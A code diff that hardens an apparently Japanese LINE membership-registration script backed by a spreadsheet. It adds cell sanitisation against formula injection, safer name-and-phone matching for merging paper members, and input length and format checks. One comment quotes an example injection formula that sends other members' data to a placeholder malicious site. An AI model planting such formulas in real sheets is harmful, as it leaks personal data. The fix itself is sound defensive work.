@@ -109,6 +109,29 @@ function normalizeName_(v) {
   return String(v == null ? '' : v).replace(/[\s　]/g, '');
 }
 
+/**
+ * 名寄せで氏名を突き合わせるための形。空白を除き、英数字は全角に、ひらがなはカタカナにそろえる
+ * （LINE側のフォームはこの変換をして送ってくるが、紙の会員はシートに手で入っているため）
+ */
+function nameKey_(v) {
+  return normalizeName_(v)
+    .replace(/[A-Za-z0-9]/g, function (m) { return String.fromCharCode(m.charCodeAt(0) + 0xFEE0); })
+    .replace(/[ぁ-ゖ]/g, function (m) { return String.fromCharCode(m.charCodeAt(0) + 0x60); });
+}
+
+/**
+ * シートに書く前の無害化。
+ * = + - @ で始まる文字列はスプレッドシートが数式として実行してしまう。
+ * 例えば氏名に =IMAGE("https://悪意のあるサイト/?"&C2) と入れられると、
+ * スタッフがシートを開いた瞬間に他の会員の個人情報が外部へ送られる。
+ * 先頭に ' を付けると文字列として扱われ、画面にも ' は表示されない
+ */
+function sanitizeCell_(v) {
+  var s = String(v == null ? '' : v).replace(/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]/g, '');
+  if (/^[=+\-@\t\r\n]/.test(s)) s = "'" + s;
+  return s;
+}
+
 function getSheet_() {
   return SpreadsheetApp.openById(SHEET_ID).getSheetByName(SHEET_NAME);
 }
@@ -128,19 +151,18 @@ function findRowByUid_(data, uid) {
  * 同姓同名の別人が登録したときに、先に登録していた人のLINE IDを上書きして
  * 会員記録を乗っ取ってしまうため。
  *
- * 電話番号の一致を先に探す。同姓同名より確実なので、氏名の偶然の一致に負けないようにする。
+ * 氏名と電話番号の【両方】が一致した行だけを対象にする。
+ * 氏名だけ・電話番号だけで紐付けると、他人の名前（または電話番号）を知っているだけで
+ * その人の紙の会員番号を自分のLINEに取り込めてしまう。
+ * 電話番号が空欄の紙会員は自動では紐付けない（新しい会員番号を発行し、必要なら店頭で手で統合する）。
  */
 function findMergeRow_(data, phone, name) {
-  var i;
-  for (i = 1; i < data.length; i++) {
+  if (phone === '' || name === '') return -1;
+  for (var i = 1; i < data.length; i++) {
     if (String(data[i][COL_UID]).trim() !== '') continue;
     var rowPhone = normalizePhone_(data[i][COL_PHONE]);
-    if (phone !== '' && rowPhone !== '' && rowPhone === phone) return i;
-  }
-  for (i = 1; i < data.length; i++) {
-    if (String(data[i][COL_UID]).trim() !== '') continue;
-    var rowName = normalizeName_(data[i][COL_NAME]);
-    if (name !== '' && rowName !== '' && rowName === name) return i;
+    var rowName = nameKey_(data[i][COL_NAME]);
+    if (rowPhone !== '' && rowPhone === phone && rowName !== '' && rowName === name) return i;
   }
   return -1;
 }
@@ -159,8 +181,18 @@ function nextMemberId_(data) {
   return String(id);
 }
 
+// 1項目あたりの文字数の上限。極端に長い値でシートを埋められないようにする
+var MAX_LEN = { name: 50, kana: 50, address: 200, phone: 30, email: 254 };
+
 /** 登録内容の確認。問題があれば日本語のメッセージ、無ければ null */
 function validateRegistration_(params) {
+  var keys = [ 'name', 'kana', 'address', 'phone', 'email' ];
+  for (var k = 0; k < keys.length; k++) {
+    var v = params[keys[k]];
+    if (v != null && typeof v !== 'string') return '入力内容を読み取れませんでした。';
+    if (v != null && v.length > MAX_LEN[keys[k]]) return '入力が長すぎます。内容をご確認ください。';
+  }
+
   var labels = [[ 'name', '氏名' ], [ 'kana', 'フリガナ' ], [ 'address', '住所' ], [ 'phone', '電話番号' ]];
   for (var i = 0; i < labels.length; i++) {
     if (normalizeName_(params[labels[i][0]]) === '') {
@@ -170,6 +202,10 @@ function validateRegistration_(params) {
   var digits = normalizePhone_(params.phone);
   if (digits.length < 10 || digits.length > 11) {
     return '電話番号は数字10〜11桁で入力してください。';
+  }
+  var email = String(params.email == null ? '' : params.email).trim();
+  if (email !== '' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+    return 'メールアドレスの形式が正しくありません。';
   }
   return null;
 }
@@ -205,7 +241,7 @@ function handleRegister_(uid, params) {
     }
 
     // 紙の会員などとの名寄せ
-    var merge = findMergeRow_(data, normalizePhone_(params.phone), normalizeName_(params.name));
+    var merge = findMergeRow_(data, normalizePhone_(params.phone), nameKey_(params.name));
     if (merge !== -1) {
       sheet.getRange(merge + 1, COL_UID + 1).setValue(uid);
       return json_({ status: 'success', memberId: String(data[merge][COL_MEMBER_ID]) });
@@ -216,11 +252,11 @@ function handleRegister_(uid, params) {
     sheet.appendRow([
       uid,
       newId,
-      params.name,
-      params.kana,
-      params.address,
-      params.phone,
-      params.email,
+      sanitizeCell_(params.name),
+      sanitizeCell_(params.kana),
+      sanitizeCell_(params.address),
+      sanitizeCell_(params.phone),
+      sanitizeCell_(String(params.email == null ? '' : params.email).trim()),
       Utilities.formatDate(new Date(), 'JST', 'yyyy/MM/dd HH:mm:ss')
     ]);
     return json_({ status: 'success', memberId: newId });
@@ -237,6 +273,9 @@ function doPost(e) {
     params = JSON.parse(e.postData.contents);
   } catch (err) {
     return json_({ status: 'error', message: 'リクエストを読み取れませんでした。' });
+  }
+  if (!params || typeof params !== 'object' || typeof params.idToken !== 'string') {
+    params = { idToken: '' };   // 形のおかしい本文は「トークン無し」として扱う
   }
 
   // ここが要。クライアントの申告ではなく、LINEに確認したIDだけを使う
